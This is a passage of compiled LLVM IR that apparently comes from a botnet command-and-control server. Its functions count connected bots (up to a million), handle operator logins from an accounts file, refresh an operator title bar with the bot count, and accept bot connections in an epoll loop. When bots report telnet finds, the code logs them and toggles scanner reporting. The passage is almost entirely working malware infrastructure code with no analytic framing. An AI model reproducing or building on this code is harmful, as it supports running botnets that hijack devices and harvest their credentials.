  %132 = load i32, i32* %131, align 8
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !12

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %157

147:                                              ; preds = %144
  %148 = load i32, i32* %10, align 4
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0), i64 13, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %147
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %88

154:                                              ; preds = %147
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 %155)
  br label %88

157:                                              ; preds = %144
  %158 = load i32, i32* %10, align 4
  %159 = call i32 @make_socket_non_blocking(i32 %158)
  store i32 %159, i32* %5, align 4
  %160 = load i32, i32* %5, align 4
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %165

162:                                              ; preds = %157
  %163 = load i32, i32* %10, align 4
  %164 = call i32 @close(i32 %163)
  br label %183

165:                                              ; preds = %157
  %166 = load i32, i32* %10, align 4
  %167 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %168 = bitcast %union.epoll_data* %167 to i32*
  store i32 %166, i32* %168, align 1
  %169 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %169, align 1
  %170 = load volatile i32, i32* @epollFD, align 4
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @epoll_ctl(i32 %170, i32 1, i32 %171, %struct.epoll_event* %3) #9
  store i32 %172, i32* %5, align 4
  %173 = load i32, i32* %5, align 4
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %178

175:                                              ; preds = %165
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %176 = load i32, i32* %10, align 4
  %177 = call i32 @close(i32 %176)
  br label %183

178:                                              ; preds = %165
  %179 = load i32, i32* %10, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %180
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 1
  store i8 1, i8* %182, align 4
  br label %88

183:                                              ; preds = %175, %162, %102, %101
  br label %292

184:                                              ; preds = %77
  %185 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %186 = load i32, i32* %7, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %185, i64 %187
  %189 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %188, i32 0, i32 1
  %190 = bitcast %union.epoll_data* %189 to i32*
  %191 = load i32, i32* %190, align 1
  store i32 %191, i32* %13, align 4
  %192 = load i32, i32* %13, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %193
  store %struct.clientdata_t* %194, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %195 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %196 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %195, i32 0, i32 1
  store i8 1, i8* %196, align 4
  br label %197

197:                                              ; preds = %184, %288
  %198 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %198, i8 0, i64 2048, i1 false)
  br label %199

199:                                              ; preds = %263, %262, %255, %247, %231, %225, %197
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %200, i8 0, i64 2048, i1 false)
  %201 = icmp ne i8* %200, null
  br i1 %201, label %202, label %208

202:                                              ; preds = %199
  %203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %204 = load i32, i32* %13, align 4
  %205 = call i32 @fdgets(i8* %203, i32 2048, i32 %204)
  %206 = sext i32 %205 to i64
  store i64 %206, i64* %16, align 8
  %207 = icmp sgt i64 %206, 0
  br label %208

208:                                              ; preds = %202, %199
  %209 = phi i1 [ false, %199 ], [ %207, %202 ]
  br i1 %209, label %210, label %266

210:                                              ; preds = %208
  %211 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0)) #8
  %213 = icmp eq i8* %212, null
  br i1 %213, label %214, label %215

214:                                              ; preds = %210
  store i32 1, i32* %15, align 4
  br label %266

215:                                              ; preds = %210
  %216 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %216)
  %217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %219 = icmp eq i32 %218, 0
  br i1 %219, label %220, label %226

220:                                              ; preds = %215
  %221 = load i32, i32* %13, align 4
  %222 = call i64 @send(i32 %221, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i64 5, i32 16384)
  %223 = icmp eq i64 %222, -1
  br i1 %223, label %224, label %225

224:                                              ; preds = %220
  store i32 1, i32* %15, align 4
  br label %266

225:                                              ; preds = %220
  br label %199, !llvm.loop !13

226:                                              ; preds = %215
  %227 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %228 = call i8* @strstr(i8* %227, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0)) #8
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = icmp eq i8* %228, %229
  br i1 %230, label %231, label %242

231:                                              ; preds = %226
  %232 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %233 = call i8* @strstr(i8* %232, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0)) #8
  %234 = getelementptr inbounds i8, i8* %233, i64 7
  store i8* %234, i8** %18, align 8
  %235 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %236 = load i8*, i8** %18, align 8
  %237 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %235, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0), i8* %236)
  %238 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %239 = call i32 @fflush(%struct._IO_FILE* %238)
  %240 = load volatile i32, i32* @TELFound, align 4
  %241 = add nsw i32 %240, 1
  store volatile i32 %241, i32* @TELFound, align 4
  br label %199, !llvm.loop !13

242:                                              ; preds = %226
  %243 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %244 = call i8* @strstr(i8* %243, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0)) #8
  %245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %246 = icmp eq i8* %244, %245
  br i1 %246, label %247, label %250

247:                                              ; preds = %242
  %248 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %249 = call i8* @strstr(i8* %248, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0)) #8
  store i8* %249, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %199, !llvm.loop !13

250:                                              ; preds = %242
  %251 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %252 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0)) #8
  %253 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %254 = icmp eq i8* %252, %253
  br i1 %254, label %255, label %258

255:                                              ; preds = %250
  %256 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %257 = call i8* @strstr(i8* %256, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0)) #8
  store i8* %257, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %199, !llvm.loop !13

258:                                              ; preds = %250
  %259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %260 = call i32 @strcmp(i8* %259, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0)) #8
  %261 = icmp eq i32 %260, 0
  br i1 %261, label %262, label %263

262:                                              ; preds = %258
  br label %199, !llvm.loop !13

263:                                              ; preds = %258
  %264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %265 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i64 0, i64 0), i8* %264)
  br label %199, !llvm.loop !13

266:                                              ; preds = %224, %214, %208
  %267 = load i64, i64* %16, align 8
  %268 = icmp eq i64 %267, -1
  br i1 %268, label %269, label %275

269:                                              ; preds = %266
  %270 = call i32* @__errno_location() #10
  %271 = load i32, i32* %270, align 4
  %272 = icmp ne i32 %271, 11
  br i1 %272, label %273, label %274

273:                                              ; preds = %269
  store i32 1, i32* %15, align 4
  br label %274

274:                                              ; preds = %273, %269
  br label %289

275:                                              ; preds = %266
  %276 = load i64, i64* %16, align 8
  %277 = icmp eq i64 %276, 0
  br i1 %277, label %278, label %279

278:                                              ; preds = %275
  store i32 1, i32* %15, align 4
  br label %289

279:                                              ; preds = %275
  br label %280

280:                                              ; preds = %279
  %281 = load i32, i32* %15, align 4
  %282 = icmp ne i32 %281, 0
  br i1 %282, label %283, label %288

283:                                              ; preds = %280
  %284 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %285 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %284, i32 0, i32 1
  store i8 0, i8* %285, align 4
  %286 = load i32, i32* %13, align 4
  %287 = call i32 @close(i32 %286)
  br label %288

288:                                              ; preds = %283, %280
  br label %197

289:                                              ; preds = %278, %274
  br label %290

290:                                              ; preds = %289
  br label %291

291:                                              ; preds = %290
  br label %292

292:                                              ; preds = %291, %183, %58
  %293 = load i32, i32* %7, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %7, align 4
  br label %27, !llvm.loop !14

295:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.71, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.71, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Find_Login(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @TitleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %6 = load i8*, i8** %2, align 8
  %7 = ptrtoint i8* %6 to i32
  store i32 %7, i32* %4, align 4
  br label %8

8:                                                ; preds = %1, %25
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %9, i8 0, i64 2048, i1 false)
  %10 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %11 = call i32 @BotsConnected()
  %12 = load i32, i32* %3, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %13
  %15 = getelementptr inbounds %struct.login_info, %struct.login_info* %14, i32 0, i32 0
  %16 = getelementptr inbounds [100 x i8], [100 x i8]* %15, i64 0, i64 0
  %17 = call i32 (i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.16, i64 0, i64 0), i32 27, i32 %11, i8* %16, i32 7) #9
  %18 = load i32, i32* %4, align 4
  %19 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %21 = call i64 @strlen(i8* %20) #8
  %22 = call i64 @send(i32 %18, i8* %19, i64 %21, i32 16384)
  %23 = icmp eq i64 %22, -1
  br i1 %23, label %24, label %25

24:                                               ; preds = %8
  ret i8* null

25:                                               ; preds = %8
  %26 = call i32 @sleep(i32 2)
  br label %8
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [2048 x i8], align 16
  %32 = alloca [2048 x i8], align 16
  %33 = alloca [2048 x i8], align 16
  %34 = alloca [5000 x i8], align 16
  %35 = alloca [800 x i8], align 16
  %36 = alloca [800 x i8], align 16
  %37 = alloca [800 x i8], align 16
  %38 = alloca [800 x i8], align 16
  %39 = alloca [800 x i8], align 16
  %40 = alloca [5000 x i8], align 16
  %41 = alloca [800 x i8], align 16
  %42 = alloca [800 x i8], align 16
  %43 = alloca [800 x i8], align 16
  %44 = alloca [800 x i8], align 16
  %45 = alloca [800 x i8], align 16
  %46 = alloca [800 x i8], align 16
  %47 = alloca [800 x i8], align 16
  %48 = alloca [800 x i8], align 16
  %49 = alloca [5000 x i8], align 16
  %50 = alloca [2048 x i8], align 16
  %51 = alloca [2048 x i8], align 16
  %52 = alloca [5000 x i8], align 16
  %53 = alloca [2048 x i8], align 16
  %54 = alloca [5000 x i8], align 16
  %55 = alloca [2048 x i8], align 16
  %56 = alloca [5000 x i8], align 16
  %57 = alloca %struct._IO_FILE*, align 8
  %58 = alloca i64, align 8
  %59 = alloca %struct.tm*, align 8
  %60 = alloca [50 x i8], align 16
  %61 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %62 = load i8*, i8** %3, align 8
  %63 = ptrtoint i8* %62 to i32
  store i32 %63, i32* %4, align 4
  %64 = load volatile i32, i32* @OperatorsConnected, align 4
  %65 = add nsw i32 %64, 1
  store volatile i32 %65, i32* @OperatorsConnected, align 4
  %66 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %66, i8 0, i64 2048, i1 false)
  %67 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %67, i8 0, i64 2048, i1 false)
  %68 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %68, i8 0, i64 2048, i1 false)
  %69 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %69, i8 0, i64 2048, i1 false)
  store i32 0, i32* %14, align 4
  %70 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  store %struct._IO_FILE* %70, %struct._IO_FILE** %13, align 8
  br label %71

71:                                               ; preds = %76, %1
  %72 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %73 = call i32 @feof(%struct._IO_FILE* %72) #9
  %74 = icmp ne i32 %73, 0
  %75 = xor i1 %74, true
  br i1 %75, label %76, label %81

76:                                               ; preds = %71
  %77 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %78 = call i32 @fgetc(%struct._IO_FILE* %77)
  store i32 %78, i32* %15, align 4
  %79 = load i32, i32* %14, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %14, align 4
  br label %71, !llvm.loop !17

81:                                               ; preds = %71
  store i32 0, i32* %16, align 4
  %82 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %82)
  br label %83

83:                                               ; preds = %88, %81
  %84 = load i32, i32* %16, align 4
  %85 = load i32, i32* %14, align 4
  %86 = sub nsw i32 %85, 1
  %87 = icmp ne i32 %84, %86
  br i1 %87, label %88, label %103

88:                                               ; preds = %83
  %89 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %90 = load i32, i32* %16, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %91
  %93 = getelementptr inbounds %struct.login_info, %struct.login_info* %92, i32 0, i32 0
  %94 = getelementptr inbounds [100 x i8], [100 x i8]* %93, i64 0, i64 0
  %95 = load i32, i32* %16, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %96
  %98 = getelementptr inbounds %struct.login_info, %struct.login_info* %97, i32 0, i32 1
  %99 = getelementptr inbounds [100 x i8], [100 x i8]* %98, i64 0, i64 0
  %100 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %89, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.17, i64 0, i64 0), i8* %94, i8* %99)
  %101 = load i32, i32* %16, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %16, align 4
  br label %83, !llvm.loop !18

103:                                              ; preds = %83
  %104 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %104, i8 0, i64 2048, i1 false)
  %105 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %106 = call i32 (i8*, i8*, ...) @sprintf(i8* %105, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0)) #9
  %107 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %108 = call i32 (i8*, i8*, ...) @sprintf(i8* %107, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.19, i64 0, i64 0)) #9
  %109 = load i32, i32* %4, align 4
  %110 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %111 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %112 = call i64 @strlen(i8* %111) #8
  %113 = call i64 @send(i32 %109, i8* %110, i64 %112, i32 16384)
  %114 = icmp eq i64 %113, -1
  br i1 %114, label %115, label %116

115:                                              ; preds = %103
  br label %753

116:                                              ; preds = %103
  %117 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %118 = load i32, i32* %4, align 4
  %119 = call i32 @fdgets(i8* %117, i32 2048, i32 %118)
  %120 = icmp slt i32 %119, 1
  br i1 %120, label %121, label %122

121:                                              ; preds = %116
  br label %753

122:                                              ; preds = %116
  %123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %123)
  %124 = load i32, i32* %5, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %125
  %127 = getelementptr inbounds %struct.login_info, %struct.login_info* %126, i32 0, i32 0
  %128 = getelementptr inbounds [100 x i8], [100 x i8]* %127, i64 0, i64 0
  %129 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %130 = call i32 (i8*, i8*, ...) @sprintf(i8* %128, i8* %129) #9
  %131 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  store i8* %131, i8** %19, align 8
  %132 = load i8*, i8** %19, align 8
  %133 = call i32 @Find_Login(i8* %132)
  store i32 %133, i32* %5, align 4
  %134 = load i8*, i8** %19, align 8
  %135 = load i32, i32* %5, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %136
  %138 = getelementptr inbounds %struct.login_info, %struct.login_info* %137, i32 0, i32 0
  %139 = getelementptr inbounds [100 x i8], [100 x i8]* %138, i64 0, i64 0
  %140 = call i32 @strcmp(i8* %134, i8* %139) #8
  %141 = icmp eq i32 %140, 0
  br i1 %141, label %142, label %184

142:                                              ; preds = %122
  %143 = load i32, i32* %4, align 4
  %144 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %145 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %146 = call i64 @strlen(i8* %145) #8
  %147 = call i64 @send(i32 %143, i8* %144, i64 %146, i32 16384)
  %148 = icmp eq i64 %147, -1
  br i1 %148, label %149, label %150

149:                                              ; preds = %142
  br label %753

150:                                              ; preds = %142
  %151 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %152 = load i32, i32* %5, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %153
  %155 = getelementptr inbounds %struct.login_info, %struct.login_info* %154, i32 0, i32 0
  %156 = getelementptr inbounds [100 x i8], [100 x i8]* %155, i64 0, i64 0
  %157 = call i32 (i8*, i8*, ...) @sprintf(i8* %151, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.21, i64 0, i64 0), i8* %156) #9
  %158 = load i32, i32* %4, align 4
  %159 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %160 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %161 = call i64 @strlen(i8* %160) #8
